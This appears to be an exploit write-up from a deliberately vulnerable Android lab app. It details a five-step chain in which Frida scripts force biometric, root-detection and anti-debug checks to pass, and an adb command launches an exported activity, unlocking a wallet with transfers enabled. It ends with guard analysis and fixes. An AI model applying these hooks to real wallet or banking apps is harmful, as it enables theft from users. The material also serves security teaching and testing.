# Chain 10 — Biometric + Root Bypass → Wallet Unlock

## Overview

| Field | Value |
|-------|-------|
| **Category** | resilience + activity |
| **Difficulty** | MEDIUM |
| **Steps** | 5 |
| **Components crossed** | KeyguardBypassActivity + libmochat.so |
| **Modern Android** | Fully exploitable (Android 13-16) |
| **decx shape** | exported activity → resilience hook → root-bypass hook → anti-debug hook → unlock |

## Vulnerable surface

- `KeyguardBypassActivity` (exported) — entry point that orchestrates all resiliency gates
- `ResilienceServiceImpl.authenticate()` — Java-level gate; result is checked in the activity
- `NativeBridge.checkRoot()` — JNI root-detection; result drives the unlock decision
- `NativeBridge.antiDebug()` — JNI anti-debug; result drives the unlock decision
- All gates are bypassable by a Frida instrumenting process on the same device

## Step-by-step exploit

### ① Frida-hook ResilienceServiceImpl.authenticate() → force return true

```bash
frida -U -f com.mochat.app -l bypass.js --no-pause
```

```javascript
// bypass.js
Java.perform(function () {
  var Auth = Java.use('com.mochat.app.resilience.ResilienceServiceImpl');
  Auth.authenticate.implementation = function () {
    console.log('[+] authenticate() -> forced true');
    return true;
  };
});
```

### ② Frida-hook NativeBridge.checkRoot() → force return false (clean)

```javascript
var NB = Java.use('com.mochat.app.nativebridge.NativeBridge');
NB.checkRoot.implementation = function () {
  console.log('[+] checkRoot() -> forced false (clean)');
  return false;
};
```

If the method is JNI-only (no Java override), hook the native symbol directly:

```bash
# Find the JNI symbol in libmochat.so and override its return value.
frida-trace -U -i "*checkRoot*" -f com.mochat.app
# then in the generated stub, set retval = 0.
```

### ③ Frida-hook NativeBridge.antiDebug() → force return false (no tracer)

```javascript
NB.antiDebug.implementation = function () {
  console.log('[+] antiDebug() -> forced false (no tracer)');
  return false;
};
```

### ④ Launch exported KeyguardBypassActivity → all gates pass

```bash
adb shell am start -n com.mochat.app/.resilience.KeyguardBypassActivity
```

**Frida console confirms**:

```
[+] authenticate() -> forced true
[+] checkRoot() -> forced false (clean)
[+] antiDebug() -> forced false (no tracer)
```

### ⑤ Wallet unlocks: balance displayed + transfer enabled without biometric

**logcat confirms**:

```
KeyguardBypassActivity: auth=true root=false debug=false -> unlock
WalletFragment: balance=8123400 transfers=ENABLED
```

The wallet is now unlocked with balance visible and the transfer action enabled — no biometric,
PIN, or credential ever presented.

## Guard analysis

| Guard | Status |
|-------|--------|
| KeyguardBypassActivity caller check | absent (exported, any caller) |
| Biometric binding (BiometricPrompt / CryptoObject) | absent (resilience check is advisory) |
| ResilienceServiceImpl result integrity | bypassable (Frida replaces return value) |
| NativeBridge.checkRoot anti-instrumentation | bypassable (return value flipped) |
| NativeBridge.antiDebug self-protection | bypassable (return value flipped) |
| Server-side re-auth before sensitive action | absent (transfer gated client-side) |

## Impact

Full wallet unlock on a device where the attacker can run Frida (rooted or instrumented via
gadget injection). The three resilience gates — biometric, root detection, anti-debug — are
all advisory client-side checks, so a single instrumented process disables them. Balance is
revealed and transfers are enabled without any legitimate credential. On a rooted device this
becomes a one-tap unlock with zero knowledge of the victim's PIN or biometric.

## Fix

- Bind the wallet unlock to `BiometricPrompt` with an associated `CryptoObject`, so a valid
  biometric is cryptographically required to release the key — not just "checked" advisory.
- Make `KeyguardBypassActivity` non-exported; remove the standalone entrypoint.
- Treat resilience checks as defense-in-depth, never as the primary gate. The authoritative
  authorization must come from the server (or from a hardware-backed key), not from a
  boolean returned by `ResilienceServiceImpl`.
- Re-auth on the server side before enabling transfers; never trust a client-side `unlocked`
  flag for value movement.
- Harden native detection with multiple overlapping checks (ptrace self-attach, `/proc/self/maps`
  scanning, `dlopen`/`dlsym` integrity) and, more importantly, server-verify a device-integrity
  attestation (Play Integrity API) before unlocking.
